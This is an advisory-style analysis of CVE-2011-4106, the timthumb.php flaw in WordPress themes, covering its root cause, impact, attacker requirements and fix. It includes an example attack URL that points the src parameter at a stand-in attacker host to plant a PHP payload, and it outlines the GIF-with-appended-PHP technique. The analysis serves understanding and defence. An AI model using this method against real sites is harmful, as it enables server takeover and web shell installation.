Based on the provided information, here's a breakdown of the vulnerability associated with CVE-2011-4106:

**Root Cause:**

*   The vulnerability lies within the `timthumb.php` script, an image resizing utility widely used in WordPress themes and plugins. The script is vulnerable due to its flawed method of checking allowed remote image sources. It uses `strpos` for domain verification, which is insufficient and allows for bypasses, like `http://blogger.com.somebadhackersite.com/badscript.php`.
*   The script's caching mechanism allows writing files to a web-accessible directory, which is exploited by the vulnerability.

**Weaknesses/Vulnerabilities:**

*   **Insecure Remote File Inclusion:**  The script improperly validates the source of remote images. It doesn't perform a strict hostname match, allowing attackers to specify URLs from malicious servers while appearing to be from an allowed domain, such as blogger.com.
*   **Unrestricted File Upload:** The script fetches the remote content and saves it to a cache directory under the webroot, without verifying if the content is actually an image, which is exploited to upload php files.

**Impact of Exploitation:**

*   **Remote Code Execution (RCE):** By crafting a special image file (e.g., a GIF with appended PHP code) and providing it to `timthumb.php` through the `src` parameter, an attacker can force the script to cache the malicious file with a `.php` extension on the server. This cached file can then be directly accessed and executed by the web server, enabling arbitrary code execution on the victim's server.
*   **Server Compromise:**  Successful exploitation allows attackers to execute arbitrary PHP code, potentially leading to full server compromise, data theft, website defacement, malware distribution, or other malicious activities.
*   **Malware Injection:** Attackers can use the vulnerability to inject malicious code into legitimate WordPress files, as observed with the `wp-blog-header.php` file modification.
*   **Backdoor Installation:** The attacker can install web shells (like Alucar shell), giving persistent access to the compromised system.

**Attack Vectors:**

*   **HTTP GET parameter:** The primary attack vector is through manipulating the `src` parameter in the URL of the `timthumb.php` script, as in `http://www.target.tld/wp-content/themes/THEME/timthumb.php?src=http://blogger.com.evildomain.tld/pocfile.php`.

**Required Attacker Capabilities/Position:**

*   **Publicly Accessible Vulnerable Instance:** The target must have a WordPress site using a vulnerable version of `timthumb.php` or a plugin that includes it.
*   **Network Access:** The attacker needs to be able to send HTTP requests to the target server.
*   **Malicious File Hosting:** The attacker needs to host a malicious file with a valid image MIME-type and appended PHP code on an accessible server.
*   **Knowledge of Vulnerable URL:** The attacker needs to know the location of the vulnerable `timthumb.php` file on the target website (can often be found via search engines).
*   **Ability to craft malicious URL:** The attacker must be able to construct a URL with a manipulated 'src' parameter to point to their malicious file.

**Additional Information:**

*   The vulnerability was widely exploited, leading to numerous hacked WordPress sites.
*   The exploit often involves using a specially crafted GIF file with appended PHP code.
*   The cached file location varies, depending on the `timthumb.php` version but is generally under a `cache` directory within the theme or plugin.
*   The issue affected many WordPress themes and plugins that included `timthumb.php`, often without modification.
*   The vulnerability was addressed with a complete rewrite in TimThumb 2.0, emphasizing security.
*   The vulnerable script often is renamed (e.g. thumb.php) so grep must search for the content not just filename.
*   Some WordPress plugins used a base64 encoded version of the URL that they passed into the timthumb script.
